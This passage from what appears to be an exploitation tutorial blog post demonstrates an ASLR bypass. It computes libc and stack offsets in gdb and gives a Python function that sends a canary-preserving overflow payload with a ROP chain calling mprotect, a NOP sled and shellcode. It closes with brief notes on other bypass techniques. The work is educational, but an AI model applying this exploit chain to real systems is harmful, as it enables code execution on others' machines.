</span></span></code></pre></div><p>After leaking them, we need to modify the <code>hijack_exec</code> function, giving it the C library base address and the shellcode address as arguments. But first, we need to calculate the information we need from these leaked addresses.</p>
<pre tabindex="0"><code>(gdb) p/x 0x7ffff7dd7d68-0x00007ffff7dae000
$1 = 0x29d68
</code></pre><p>The leaked address relative to the Libc, when subtracted from the library&rsquo;s base address, gives us this result. Therefore, we must subtract the leaked address from this result to give us the library&rsquo;s base address.</p>
<pre tabindex="0"><code>(gdb) p/x 0x7fffffffde98-(0x7fffffffddb0+0x40)
$2 = 0xa8
</code></pre><p>The leaked address relative to the Stack, when subtracted from the shellcode address, gives us this result. Therefore, we must subtract the leaked address from this result to give us the shellcode address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hijack_exec</span>(p: Popen, canary, libc_base, shellcode):
</span></span><span style="display:flex;"><span>    stack_page <span style="color:#f92672">=</span> shellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>           <span style="color:#75715e"># Aligne the address to the page boundary.</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x106</span>                               <span style="color:#75715e"># Fills the stack frame</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, canary )                <span style="color:#75715e"># Places the correct canary value </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                                 <span style="color:#75715e"># Base pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a205</span> )   <span style="color:#75715e"># pop rdi; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, stack_page )            <span style="color:#75715e"># The aligned stack page address</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2bb39</span> )   <span style="color:#75715e"># pop rsi; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x1000</span> )                <span style="color:#75715e"># Page size </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10d37d</span> )  <span style="color:#75715e"># pop rdx; ret</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x01</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x02</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x04</span> )    <span style="color:#75715e"># Protections: PROT_EXEC=0x01, PROT_WRITE=0x02, PROT_READ=0x04    </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10d200</span> )  <span style="color:#75715e"># mprotect function address</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, shellcode )             <span style="color:#75715e"># Jump into shellcode</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>                             <span style="color:#75715e"># NOPs for padding</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> buf                                        <span style="color:#75715e"># Shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span></code></pre></div><p>Now, this function can efficiently calculate all the required ROP gadgets addresses dynamically based on their relative virtual addresses (RVA) to the Libc base address. We now need to modify only two lines in the main function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>    canary, libc_relative_addr, stack_relative_addr <span style="color:#f92672">=</span> leak_stuff( p )
</span></span></code></pre></div><p>And</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>        hijack_exec( p, canary, libc_relative_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x29d68</span>, stack_relative_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa8</span> )
</span></span></code></pre></div><p>Now, everything is in order.</p>
<center><img src="/imgs/mitigations_aslr_2.png"/></center>
<p>Notice that when we run the exploit while the ASLR is running (on different modes), it works despite the randomization of the addresses, as shown in the picture.</p>
<h3 id="other-bypassing-techniques">Other Bypassing Techniques</h3>
<p>There are many methods and techniques for bypassing and circumventing ASLR. It all depends on the targeted system&rsquo;s nature, functionality, and the environment in which it operates. The solutions are endless, but they require some diligence and careful thinking. Here are some methods that can be used:</p>
<ol>
<li>
<p><strong>Non-aware ASLR Modules</strong>: Not all libraries are ASLR-protected, especially on Windows. In this case, the operating system is forced to load them into a fixed virtual memory address. This fact can be abused to build a stable ROP chain that helps us execute our code or do whatever we want.</p>
</li>
<li>
<p><strong>Low ASLR Entropy</strong>: Sometimes the ASLR is not implemented properly, randomizing addresses in a non-optimal way, where one or two bytes change, while the rest remain constant. In this case, if we are targeting a local binary that can be run multiple times or a network program that acts as a service and is automatically restarted when it crashes, the chances of it being exploited via brute force attacks increase. If you think I am joking or that this bullshit is not feasible, I would like to tell you that even in 2025, we are still seeing the use of such strategies as <a href="https://attackerkb.com/topics/WzjO6MNGY3/cve-2025-0282">CVE-2025-0282</a>.</p>
</li>
</ol>
<h2 id="conclusion">Conclusion</h2>
<p>The methods of circumventing various protections always depend primarily on the nature of the target, the environment in which it operates, its specific functionality, and many other factors of this kind. I would like to say that there is no magic method that anyone will tell you that will always allow you to bypass everything. Perhaps, yes, there are general ideas for each protection that help in bypassing it, but it depends on you. No one will help you except your experience and technical and practical skills. Perhaps a small detail in the program you are targeting, if used in an creative way, might allow you to bypass these protections. To improve your level and become able to develop your own creative exploitation strategies, you need to train and practice a lot. No one can develop complex and advanced exploits just by learning such vulnerabilities and attacks without practice and facing many scenarios. It comes gradually when you encounter many scenarios and read about different exploits. So, I advise you to read a lot and try to build exploits for previously discovered vulnerabilities yourself. This will help you a lot and improve your level insanely.</p>
</div>
    </article>
  </main>

      </div>
      <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/0xNinjaCyclone">GitHub</a>
      
         | 
        <a href="https://twitter.com/0xNinjaCyclone">Twitter</a>
      
         | 
        <a href="https://www.facebook.com/abdallah.elsharif07">Facebook</a>
      
         | 
        <a href="https://www.linkedin.com/in/0xNinjaCyclone">Linkedin</a>
      
    </p>
  
</footer>

    </div>
  </body>
</html>
